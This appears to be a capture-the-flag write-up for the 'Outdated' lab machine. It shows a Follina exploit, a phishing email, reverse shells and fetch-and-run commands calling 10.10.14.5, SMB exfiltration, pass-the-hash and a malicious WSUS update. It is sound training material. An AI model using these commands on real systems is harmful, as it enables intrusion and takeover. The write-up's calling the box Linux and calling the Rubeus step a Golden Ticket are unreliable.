@@ -1,0 +1,225 @@
+                     Outdated
+
+                                                                                  9th November 2022 / Document No D22.100.208
+                                                                                  Prepared By: C4rm3l0
+                                                                                  Machine Author: d4rkpayl0ad
+                                                                                  Difficulty: Medium
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+Outdated is a Medium Difficulty Linux machine that features a foothold based on the Follina CVE of 2022.
+The box further encompasses an Active Directory scenario, where we must pivot from domain user to
+domain controller, using an array of tools to leverage the AD 's configuration and adjacent edges to our
+advantage. The final step includes taking advantage of Windows Server Update Services- WSUS and using its
+poor configuration to compromise the domain controller.
+
+Skills Required
+
+      Fundamentals of Active Directory
+      Rudimentary BloodHound setup
+
+Skills Learned
+
+      Shadow Credentials method
+      Golden Ticket Attack
+      Navigating Active Directory
+
+Enumeration
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.175 | grep '^[0-9]' | cut -d '/' -f 1 |
+   tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.175
+Starting off with an Nmap scan, we find mostly common Active Directory (AD) services. Among those, we
+also discover ports that stand out, like 8530/8531 , which indicate that Windows Server Update Services -
+WSUS is also running. Furthermore, two hostnames are revealed in the scan, namely mail.outdated.htb
+and dc.outdated.htb . Lastly, we take note of 445/tcp and proceed to check for anonymous SMB shares.
+
+SMB
+
+Port 445 in this context typically indicates the service SMB - Server Message Blocks, which essentially is a
+way to share files or other resources across a network.
+To enumerate SMB , we can use tools such as enum4linux and smbclient to extract information, the latter
+of which shows us the shares hosted on the target machine.
+
+   smbclient -N -L outdated.htb
+Among a few defaults, the Shares share seems to be the most uncommon, so we look at that first.
+   smbclient -N \\\\outdated.htb\\Shares
+
+We find a PDF file within, which we can download to our local system using the get command. The
+document appears to be an internal memo referring to unpatched vulnerabilities on the target system.
+Moreover, the email address itsupport@outdated.htb is alluded to, which is particularly interesting since
+the first vulnerability mentioned in the document is CVE-2022-30190 , also known as Follina, a recent
+exploit on MS word/rtf docs, which is in part exploitable through email. The vulnerability is based on the
+Microsoft Support Diagnostics Tool- MSDT , which can be used to download malicious files via an embedded
+link.
+With that in mind, we can now proceed to gaining a foothold on the machine.
+
+Foothold
+
+While it is not too difficult to forge our own PoC for this CVE, there are already some repositories on GitHub
+that have done this task for us; we opt for msdt-follina, by John Hammond. Concisely, the Python script
+creates and hosts a webserver in the /tmp directory, with a malicious index.html file. The HTML file must
+be at least 4096 bytes for the exploit to work, which is why it is filled with gibberish among the actual
+payload, which itself consists of a <script> tag, as well as a Base64 -encoded powershell command:
+
+   <script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param
+   \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-
+   Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+
+   [char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+
+   [char]34+'{base64_payload}'+
+   [char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub
+   .exe\\</script>
+
+We do have to make some slight adjustments to the Python script after cloning the repository to our
+machine; more specifically, we need to change line 111 to point to our local webserver hosting the
+nc64.exe binary:
+
+   command = f"""Invoke-WebRequest http://10.10.14.5:8000/nc64.exe -OutFile
+   C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.10.14.5
+   {args.reverse}"""
+
+Once this is done, we can run the script, making sure to specify the correct interface ( OpenVPN uses tun0 ),
+as well as a port to host the webserver with the malicious HTML file, and lastly also a port to listen on for the
+reverse shell.
+
+   python3 follina.py --interface tun0 --port 80 --reverse 4444
+
+We also start up an HTTP server of our own in the same directory as the nc64.exe binary:
+
+   python3 -m http.server 8000
+
+Once that is done, we need to send an email to the IT account, which will trigger our payload and get us RCE.
+We can do that using a tool called swaks :
+   swaks --to itsupport@outdated.htb --from car@melo --server mail.outdated.htb --body
+   "http://10.10.14.5/"
+
+    We remember to add mail.outdated.htb to our /etc/hosts file
+
+While the mail service can be a little finnicky, we send the swaks request a couple of times and eventually
+get a callback to our follina.py listener:
+We now have a shell as btables .
+
+Lateral Movement
+
+As btables , we can now proceed to enumerate Active Directory using SharpHound . We download the
+latest build, and upload it to the target machine using a Python HTTP server locally, and iwr on the target
+box.
+On our reverse shell, we first upgrade the cmd shell into a PowerShell , and then use the following
+command to download SharpHound.exe from our Python server and save it as sh.exe :
+
+   powershell.exe
+   iwr http://10.10.14.5:8000/SharpHound.exe -o sh.exe
+
+We let SharpHound do some enumeration, and can then find the results in the same directory as the binary.
+   .\sh.exe -C All
+
+In order to exfiltrate our files without worrying about size limitations, we can use the existing infrastructure
+and host an SMB share on our local machine, using the impacket suite:
+
+   impacket-smbserver share . -smb2support -user user -password pass
+We can then mount the share on the target machine and move any subsequent files in there for exfiltration.
+
+   net use z: \\10.10.14.5\share /user:user pass
+   copy 20221108140327_BloodHound.zip z:
+Configuring BloodHound is beyond the scope of this writeup, but is covered extensively in this Academy
+module. Assuming its functionality, we can simply drag-and-drop the zip file we just transferred into the
+BloodHound GUI and Graph ourselves a path from the owned BTABLES@OUTDATED.HTB user, to the domain
+controller (DC).
+What this diagram essentially shows us is that btables belongs to the itstaff group, which has the
+privilege to AddKeyCredentialLink to the user we need to pivot to, namely sflowers . In turn, sflowers
+has PSRemote access to the Domain Controller.
+
+We can pivot to sflowers using the ShadowCredentials method, in which we leverage the msDS-
+KeyCredentialLink attribute between the itstaff group and sflowers . We can do this using a tool
+called Whisker , which instead of compiling ourselves, we can decompress directly onto the target machine,
+using the PowerSharpPack repository.
+
+Firstly, we get a local copy of the Invoke-Whisker.ps1 PowerShell script, and host it on a Python HTTP
+server. We then access that script from the target machine, which allows us to use a fully functional version
+of Whisker :
+
+   iex(new-object net.webclient).downloadstring('http://10.10.14.5:8000/Invoke-
+   Whisker.ps1')
+
+We then use the tool to target the sflowers user. The methodology underlying the Shadow Credentials
+attack is vast, but is nicely condensed into this blogpost. Simply put, Whiskers is about to add our own set
+of credentials - in the form of public/private keys - to sflowers , with which we can then go on to
+completely pivot onto that user.
+   Invoke-Whisker -command "add /target:sflowers"
+
+The final section of the condensed output is a Rubeus command, which is another tool with which we can
+get a Golden Ticket for this domain. In summary, a Golden Ticket attack targets the Active Directory Key
+Distribution Service Account (KRBTGT), essentially using that account to forge valid Ticket Granting Tickets
+(TGTs), which in turn give the attacker access to any resource on that domain. The intricacies of Active
+Directory are far too many to cover in a single writeup, however, further reading on the subject is highly
+recommended, and a great place to start is the Introduction to Active Directory Academy module.
+We proceed by uploading the Rubeus binary, using the same iwr methods as before, and can then copy-
+paste the command directly out of the Whisker output. While Whisker generated a new certificate for us
+and appended that to sflowers ' msDS-KeyCredentialLink attribute, Rubeus will now leverage that to get
+us the TGT of that same user.
+The final part of the output is the NTLM hash for the sflowers user. NTLM stands for New Technology Lan
+Manager, and is a security protocol used to authenticate users. Posession of this hash essentially gives us
+full access over the underlying user, which we can leverage using evil-winrm , which is pre-installed on
+most penetration-testing distributions.
+
+   evil-winrm -i dc.outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
+We have now successfully pivoted to sflowers , with the flag located at
+C:\Users\sflowers\Desktop\user.txt .
+
+Privilege Escalation
+
+As we found out during our initial enumeration, WSUS is running on the target machine, and as a quick
+whoami command reveals, the user sflowers is part of the WSUS group.
+
+   whoami /groups
+
+According to this blogpost on WSUS exploitation, we can locate the server by querying the following registry
+key:
+   reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+
+We can see the server running on non-SSL HTTP, under the domain wsus.outdated.htb . We then query
+the subsequent registry key returned by our initial query, to check whether UseWUServer is set to 1 and
+verify that the service is in fact active.
+
+   reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+
+With that in mind, we will now attempt to attack this service using SharpWSUS , which will leverage this
+group membership to inject a malicious WSUS update. Conveniently, the tool is also hosted in the
+aforementioned PowerSharpPack repository, saving us the trouble of having to compile it ourselves on a
+Windows system. The file Invoke-SharpWSUS.ps1 entails a Base64 -encoded string, which is the
+compressed pre-compiled binary. Therefore, all we have to do is extract the string into a file, decode it into a
+new file, and then unzip the latter:
+
+   cat b64_sharpwsus | base64 -d > SharpWSUS.gz
+   gzip -d SharpWSUS.gz
+We now have the Sharpwsus.exe binary, which we upload onto the target system.
+   iwr http://10.10.14.5:8000/SharpWSUS -o SharpWSUS.exe
+Before we proceed, we switch to a cmd.exe shell, as it proves to be both more stable, and faster than our
+evil-winrm shell. To do that, we upload Netcat to the target system.
+   iwr http://10.10.14.5:8000/nc64.exe -o nc64.exe
+While listening on port 4444 locally, run Netcat to get our reverse shell.
+
+   start-process .\nc64.exe -args "-e cmd.exe 10.10.14.5 4444"
+We are now ready to start exploiting WSUS . Following along with the aforementioned blogpost, we find a
+section that covers Lateral movement using psexec , a binary which is also found in sflowers ' Desktop
+directory. The following command creates a malicious WSUS update, whose payload is a Netcat reverse
+shell.
+
+   SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"-
+   accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.5 9001"
+   /title:"pwned"
+
+We also find the next commands we need to run in the tail of the output. We must first approve the update
+before our payload is triggered. We set up our listener on port 9001 in anticipation, and run the next
+command, making sure to correctly set the computername and groupname parameters.
+   SharpWSUS.exe approve /updateid:1ece2bf6-d412-4099-96e3-8efd46f616c8
+   /computername:dc.outdated.htb /groupname:"pwned"
+After a few minutes, during which the "update" is downloaded and installed, we get a callback to our
+listener.
+
+The final flag can be found at C:\Users\Administrator\Desktop\root.txt .
+
